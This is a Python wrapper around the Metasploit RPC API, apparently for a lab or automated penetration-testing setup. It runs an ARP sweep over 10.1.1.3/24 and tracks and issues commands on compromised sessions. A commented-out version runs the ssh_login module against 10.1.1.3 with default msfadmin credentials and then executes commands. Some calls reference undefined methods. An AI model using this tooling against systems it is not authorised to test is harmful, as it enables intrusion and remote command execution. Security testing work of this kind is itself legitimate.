import os
import time
import json
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod

class Metasploit:
    
    def __init__(self, password, server='127.0.0.1', port=1337):
        self.name = "Metasploit API"
        print(f"Starting {self.name}")
        while True:
            try: 
                self.client = MsfRpcClient(password, server=server, port=port)
                break  # Successful connection
            except:
                print("[!] Failed. Trying again...")
                time.sleep(1)

        print(f"[+] Successfully connected to MSF Server!")
        self.targets = {}
        
    def save_session(self, framework_name, session_id):
        hostID = f"{framework_name}{session_id}"
        self.targets[hostID] = session_id
        
    def query_hosts(self):
        """Retrieve all hosts from Metasploit, filtered by kwargs."""
        hosts = self.client.db.hosts
        print("Retrieved Metasploit compromised hosts")
        for session_id in self.client.sessions.list.keys():
            if not any(session_id == str(val) for val in self.targets.values()):
                self.save_session("msf", int(session_id))        
        return hosts

    def send_cmd(self, id=None, os=None, *commands):
        """
        Run a command on the host specified by `id`, filtered by OS if provided.
        """
        output = []
        if not id:
            raise ValueError("Host ID must be provided.")

        # Get session ID from targets mapping
        session_id = self.targets.get(id)
        if not session_id:
            raise ValueError(f"Host ID {id} not found in targets.")

        # Locate the session
        session = self.client.sessions.list.get(str(session_id))
        if not session:
            raise ValueError(f"Session with ID {session_id} not found.")

        # Check OS/platform if provided
        if os and session['platform'] != os:
            raise ValueError(f"Session {session_id} is not running on the specified OS: {os}.")

        # Run the command and collect output
        for cmd in commands:
            try:
                print(f"Sent command {cmd} on target with id: {id}")
                cmd_output = self.client.sessions.session(str(session_id)).run_with_output(cmd)
                output.append(cmd_output)
                print(f"Successfully sent command, received output.")
            except Exception as e:
                output.append(f"Error executing command '{cmd}': {e}")

        return output
    
    def list_exploit(self, module_type):
        if not self.client:
            raise ConnectionError("Not connected")
        return self.client.modules.search(module_type)
    
    def get_host(self, os=None):
    
    # Check if the host is already cached
        if self.targets:
            print("[+] Returning cached target information.")
            return self.filter_target(self.targets, os=os)

        # Use an auxiliary module for discovery if not cached
        print("[*] No target hosts found. Running discovery...")
        use_exploit = self.client.modules.use('auxiliary', 'scanner/discovery/arp_sweep')
        use_exploit['RHOSTS'] = '10.1.1.3/24' 

        # Execute the module
        job_id = use_exploit.execute()
        print(f"[+] ARP sweep started with Job ID: {job_id}. Waiting for results...")

        # Poll for results (simulated)
        time.sleep(5)  # Simulate waiting for module execution

        # Fetch discovered hosts from the Metasploit database
        hosts = self.fetch_hosts_from_db()

        if not hosts:
            print("[!] No hosts found in the database. Ensure the discovery module ran successfully.")
            return []

        print(f"[+] Discovered {len(hosts)} hosts!")

        # Save to cache
        self.cached_hosts = hosts

        # Filter by OS if specified
        return self.filter_hosts(hosts, os=os)



    def fetch_hosts_from_db(self):
        """
        Retrieve hosts from the Metasploit database using the RPC method.

        Returns:
            List of hosts retrieved from the database.
        """
        try:
            # Query hosts using RPC call
            response = self.method.rpc.call('db.hosts', {})
            hosts = response.get('hosts', [])

            if not hosts:
                print("[!] No hosts retrieved. Ensure the discovery module ran successfully.")
                return []

            print("[+] Discovered Hosts:")
            for host in hosts:
                print(f"  - IP: {host['address']}, OS: {host.get('os_name', 'Unknown')}, Name: {host.get('name', 'Unknown')}")

            return hosts

        except Exception as e:
            print(f"[!] Failed to retrieve hosts from database: {e}")
            return []




    def filter_hosts(self, hosts, os=None):
        """
        Filter hosts by OS.
        """
        if not os:
            return hosts
        filtered_hosts = [host for host in hosts if host.get('os_name', '').lower() == os.lower()]
        print(f"[+] Filtered hosts by OS='{os}': {len(filtered_hosts)} found.")
        return filtered_hosts

    
    


    
''' class Metasploit:
    def __init__(self):
        self.name = "Metasploit API"
        print(f"Starting {self.name}")
        
        # Set up connection variables
        self.msf_server = os.getenv("MSF_HOST", "127.0.0.1")
        self.msf_port = int(os.getenv("MSF_PORT", 55553))
        self.msf_password = os.getenv("MSF_PASSWORD")
        
        # Attempt to connect to Metasploit server
        self.client = self._connect_to_msf()

    def _connect_to_msf(self):
        print(f"[-] Attempting to connect to MSF at {self.msf_server}:{self.msf_port}")
        while True:
            try:
                #client = MsfRpcClient(self.msf_password, server=self.msf_server, port=self.msf_port)
                print(f"[+] Successfully connected to MSF Server!")
                break # REMOVE THIS
                #return client
            except Exception as e:
                print(f"[!] Connection failed: {e}. Trying again...")
                time.sleep(1)

    def format_output(self, output):
        """Format the output with line breaks for readability."""
        return "\n".join(output.splitlines())

    def run_exploit(self, target_ip="10.1.1.3", username="msfadmin", password="msfadmin", commands=None):
        """
        Run SSH brute force and execute commands in the session.
        
        :param target_ip: Target IP for SSH brute-force attack
        :param username: SSH username
        :param password: SSH password
        :param commands: List of commands to execute in the session
        :return: JSON-like dict with status, session ID, and command output
        """
        if not commands:
            return {"status": "error", "message": "No commands provided"}

        try:
            # Set up and execute the auxiliary SSH brute-force module
            module = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
            module['RHOSTS'] = target_ip
            module['USERNAME'] = username
            module['PASSWORD'] = password
            module.execute()
            time.sleep(3)  # Wait for the session to establish

            # Check for available sessions
            sessions = self.client.sessions.list
            if not sessions:
                return {"status": "error", "message": "No session established"}

            # Retrieve the latest session ID
            session_id = max(sessions.keys())
            session = self.client.sessions.session(session_id)

            # Execute each command in the session and capture output
            output = {}
            for cmd in commands:
                session.write(cmd)
                time.sleep(1)  # Adjust sleep time based on command requirements
                response = self.format_output(session.read())
                output[cmd] = response

            # Prepare JSON-like response
            return {
                "status": "Commands executed",
                "session_id": session_id,
                "output": output
            }

        except Exception as e:
            print(f"[Error] {e}")
            return {"status": "error", "message": str(e)}

# Example usage:
# msf = Metasploit()
# response = msf.run_exploit(commands=["uname -a", "id"])
# print(json.dumps(response, indent=4))'''